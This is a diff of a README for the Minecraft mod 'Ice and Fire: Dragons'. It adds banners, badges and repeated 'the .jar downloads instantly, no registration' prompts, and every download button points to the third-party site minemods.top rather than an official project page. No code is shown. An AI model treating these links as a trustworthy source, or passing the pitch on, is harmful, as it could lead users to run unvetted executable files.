@@ -1,3 +1,19 @@
+<div align="center">
+  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=900&size=74&pause=240&color=00CED1&center=true&vCenter=true&width=1580&lines=ICE+AND+FIRE+2026;DRAGONS+•+TAMING+•+ADVENTURE;FORGE+•+NEOFORGE" alt="Ice and Fire: Dragons 2026" />
+</div>
+
+<br/>
+
+<div align="center">
+  <div style="display:flex;justify-content:center;gap:26px;flex-wrap:wrap;">
+    <img src="https://img.shields.io/badge/Status-ACTIVE-00C853?style=for-the-badge">
+    <img src="https://img.shields.io/badge/Version-2026-00CED1?style=for-the-badge">
+    <img src="https://img.shields.io/badge/Platform-PC_|_Mac_|_Linux-FF5722?style=for-the-badge">
+    <img src="https://img.shields.io/badge/Minecraft-1.18.2_--_1.21.1-62B47A?style=for-the-badge&logo=minecraft&logoColor=white">
+    <img src="https://img.shields.io/badge/File-.jar-2196F3?style=for-the-badge">
+    <img src="https://img.shields.io/badge/Loader-Forge_|_NeoForge-FF9800?style=for-the-badge">
+  </div>
+</div>
 
 <br/>
 
@@ -15,6 +31,8 @@ Beyond dragons, the mod adds a full bestiary of mythical creatures: Hippogryphs,
 
 [![Download from MineMods.top](https://img.shields.io/badge/DOWNLOAD-minemods.top-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=00CED1)](https://minemods.top/)
 
+> 📥 **Click the button — the `.jar` download starts instantly.** No pages, no waiting, no registration.
+>
 > 📦 File format: `.jar`
 > 📁 Install path: `.minecraft/mods/`
 > 🧩 Works with: **Forge, NeoForge**
@@ -130,6 +148,7 @@ The mod also introduces dozens of mythological creatures and structures, making 
 ### 2️⃣ Download the `.jar` and Citadel
 [![Download from MineMods.top](https://img.shields.io/badge/DOWNLOAD-minemods.top-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=00CED1)](https://minemods.top/)
 
+> 📥 **Click — the `.jar` downloads instantly.**
 > ⚠️ **Required dependency:** **Citadel** — download it from the same source.
 
 ### 3️⃣ Drop both files into `.minecraft/mods/`
@@ -213,7 +232,7 @@ A: **1.18.2, 1.19.2, 1.20.1, and 1.21.1**. Community NeoForge ports exist for ne
 A: Forge and NeoForge are official. A community Fabric port exists.
 
 **Q: What does it require?**
-A: **Citadel** is required. For 1.12.2 and older, LLibrary was used instead.
+A: **Citadel** is required.
 
 **Q: How do I get a dragon?**
 A: Slay a female Stage 4–5 dragon for a chance at an egg. Hatch it by placing it in fire (Fire), water (Ice), or rain (Lightning).
@@ -247,6 +266,8 @@ A: Contact us via [minemods.top](https://minemods.top/)
 ## 📥 Download Ice and Fire: Dragons
 
 [![Download from MineMods.top](https://img.shields.io/badge/DOWNLOAD-minemods.top-brightgreen?style=for-the-badge&logo=download&logoColor=white&color=00CED1)](https://minemods.top/)
+
+> 📥 **Click — the `.jar` starts downloading instantly.**
 
 ---
 
